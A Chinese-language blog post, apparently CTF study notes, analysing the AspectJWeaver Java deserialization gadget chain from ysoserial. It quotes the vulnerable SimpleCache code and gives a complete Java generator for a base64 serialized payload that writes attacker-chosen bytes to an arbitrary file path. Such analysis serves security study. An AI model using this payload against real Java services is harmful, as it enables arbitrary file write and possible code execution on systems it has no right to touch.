# [Java反序列化]AspectJWeaver反序列化

## 前言

2021年二月份`ysoserialize`增加了这条`AspectJWeaver`链子，之后陆续在2021年的`D3CTF`以及国赛决赛中都出现了这条链子的攻击，所以学习一下`AspectJWeaver`的反序列化，之后再复现一下D3CTF和国赛决赛的两道Java。

## 依赖

```xml
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
        <dependency>
            <groupId>org.aspectj</groupId>
            <artifactId>aspectjweaver</artifactId>
            <version>1.9.2</version>
        </dependency>
```

需要存在CC链。

## 分析

首先看一下yso的chain：

```xml
Gadget chain:
HashSet.readObject()
    HashMap.put()
        HashMap.hash()
            TiedMapEntry.hashCode()
                TiedMapEntry.getValue()
                    LazyMap.get()
                        SimpleCache$StorableCachingMap.put()
                            SimpleCache$StorableCachingMap.writeToPath()
                                FileOutputStream.write()
```

前面部分是7u21，中间是CC6。从`SimpleCache$StorableCachingMap.put()`开始看起了。

`StorableCachingMap`是`SimpleCache`的内部类，它`extends HashMap`并且重写了`put`方法：

```java
		@Override
		public Object put(Object key, Object value) {
			try {
				String path = null;
				byte[] valueBytes = (byte[]) value;
				
				if (Arrays.equals(valueBytes, SAME_BYTES)) {
					path = SAME_BYTES_STRING;
				} else {
					path = writeToPath((String) key, valueBytes);
				}
				Object result = super.put(key, path);
				storeMap();
				return result;
			} catch (IOException e) {
				trace.error("Error inserting in cache: key:"+key.toString() + "; value:"+value.toString(), e);
				Dump.dumpWithException(e);
			}
			return null;
		}
```

当调用`put`的时候，会触发`path = writeToPath((String) key, valueBytes);`：

```java
		private String writeToPath(String key, byte[] bytes) throws IOException {
			String fullPath = folder + File.separator + key;
			FileOutputStream fos = new FileOutputStream(fullPath);
			fos.write(bytes);
			fos.flush();
			fos.close();
			return fullPath;
		}
```

实现文件写入，即将put方法的`value`写入到`folder + File.separator + key`中。

测试：

```java
    public static void main(String[] args) throws Exception{
        Class clazz = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor declaredConstructor = clazz.getDeclaredConstructor(String.class,int.class);
        declaredConstructor.setAccessible(true);
        HashMap map = (HashMap)declaredConstructor.newInstance("D:\\\\", 123);
        map.put("1.txt","123".getBytes(StandardCharsets.UTF_8));
    }
```

成功将123写入到`D:\flag`文件中。

构造出来：

```java
    public static void main(String[] args) throws Exception{
        Class clazz = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor declaredConstructor = clazz.getDeclaredConstructor(String.class,int.class);
        declaredConstructor.setAccessible(true);
        HashMap map = (HashMap)declaredConstructor.newInstance("D:\\\\", 123);
        ConstantTransformer constantTransformer = new ConstantTransformer("evil code".getBytes(StandardCharsets.UTF_8));
        Map outerMap = LazyMap.decorate(map,constantTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,"1.txt");
        HashSet hashSet = new LinkedHashSet(1);
        hashSet.add(tiedMapEntry);
        outerMap.remove("1.txt");
        System.out.println(Base64.getEncoder().encodeToString(SerializeUtil.serialize(hashSet)));
    }
```

我没有去管`hashSet.add(tiedMapEntry);`的时候还会在自己的电脑上触发一次，只要生成的payload能用就行了。感兴趣的师傅们可以自己构造一下`HashSet`的那部分使得在自己的电脑上不会触发，或者说直接抄一下yso的代码也都可以。

